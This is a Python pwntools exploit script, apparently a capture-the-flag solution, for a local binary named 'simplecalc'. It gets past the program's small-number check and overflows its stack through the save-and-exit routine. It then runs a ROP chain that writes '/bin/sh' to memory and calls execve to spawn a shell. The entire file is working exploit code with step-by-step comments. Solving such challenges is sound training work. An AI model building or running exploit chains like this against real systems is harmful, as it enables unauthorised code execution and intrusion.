from pwn import *

# Start the process
target = process('./simplecalc')
# Optional: gdb.attach(target, gdbscript='b *0x40154a')

# --- Step 1: Send number of calculations ---
target.recvuntil(b'calculations: ')
target.sendline(b'100')  # Must be between 4 and 255

# --- Step 2: Define ROP gadget addresses ---
pop_rax = 0x44db34      # pop rax; ret
pop_rdi = 0x401b73      # pop rdi; ret
pop_rsi = 0x401c87      # pop rsi; ret
pop_rdx = 0x437a85      # pop rdx; ret
mov_mem_rax_rdx = 0x44526e  # mov qword ptr [rax], rdx; ret
syscall_addr = 0x400488     # syscall

# Writable memory address (from binary's .data/.bss)
write_addr = 0x6c1000

# "/bin/sh" as a 64-bit little-endian integer (null-terminated)
binsh = u64(b'/bin/sh\0')  # = 0x68732f6e69622f

# --- Step 3: Helper functions ---
def do_addition(result):
    """Perform addition so that x + y = result, bypassing 'small number' check."""
    target.recvuntil(b'=> ')
    target.sendline(b'1')                # Choose addition
    target.recvuntil(b'x: ')
    target.sendline(b'100')             # x = 100 (> 0x27)
    target.recvuntil(b'y: ')
    target.sendline(str(result - 100).encode())  # y = result - 100

def send_qword(val):
    """Send a 64-bit value using two 32-bit results."""
    low = val & 0xFFFFFFFF
    high = (val >> 32) & 0xFFFFFFFF
    do_addition(low)
    do_addition(high)

# --- Step 4: Overflow setup ---
# We need to write 72 bytes (18 x 4-byte integers) before overwriting RIP
# Each send_qword() writes 8 bytes (2 x 4-byte ints), so 9 calls = 72 bytes
for _ in range(9):
    send_qword(0)  # Overwrite vulnBuf + calculations ptr + rbp with zeros

# --- Step 5: Build ROP chain ---
# Write "/bin/sh" to write_addr
send_qword(pop_rax)
send_qword(write_addr)
send_qword(pop_rdx)
send_qword(binsh)
send_qword(mov_mem_rax_rdx)

# Set up execve syscall: execve("/bin/sh", 0, 0)
send_qword(pop_rax)
send_qword(0x3b)        # sys_execve = 59
send_qword(pop_rdi)
send_qword(write_addr)  # rdi = &"/bin/sh"
send_qword(pop_rsi)
send_qword(0)           # rsi = NULL
send_qword(pop_rdx)
send_qword(0)           # rdx = NULL
send_qword(syscall_addr)

# --- Step 6: Trigger overflow ---
target.recvuntil(b'=> ')
target.sendline(b'5')  # Save and Exit → memcpy → overflow → ROP

# --- Step 7: Get shell ---
target.interactive()
